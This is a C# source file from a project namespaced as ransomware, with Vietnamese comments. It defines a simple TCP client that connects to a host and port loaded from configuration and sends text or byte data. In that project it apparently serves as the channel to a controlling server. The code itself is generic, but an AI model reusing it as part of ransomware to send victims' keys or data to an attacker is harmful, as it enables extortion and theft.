using System.Net.Sockets;
using System.Text;
using Ransomware.Sources.Utils;

namespace Ransomware.Sources.Application;

class NetworkClient
{
    private readonly string host;
    private readonly int port;
    private TcpClient client;
    private NetworkStream? stream;

    public NetworkClient()
    {
        (this.host, this.port) = Config.LoadNetwork();
        this.client = new TcpClient();
        this.stream = null;
    }

    // Kết nối đến server
    public bool Connect()
    {
        try
        {
            this.client = new TcpClient(this.host, this.port);
            this.stream = client.GetStream();
            return true;
        }
        catch
        {
            return false;
        }
    }

    public bool SendData(string message)
    {
        if (this.stream == null || !this.client.Connected) return false;

        try
        {
            byte[] data = Encoding.UTF8.GetBytes(message);
            this.stream.Write(data, 0, data.Length);
            return true;
        }
        catch
        {
            return false;
        }
    }

    // Gửi dữ liệu dạng byte[]
    public bool SendData(byte[] data)
    {
        if (this.stream == null || !this.client.Connected) return false;

        try
        {
            this.stream.Write(data, 0, data.Length);
            return true;
        }
        catch
        {
            return false;
        }
    }

    public bool Disconnect()
    {
        try
        {
            this.stream?.Close();
            this.client?.Close();
            return true;
        }
        catch
        {
            return false;
        }
    }
}
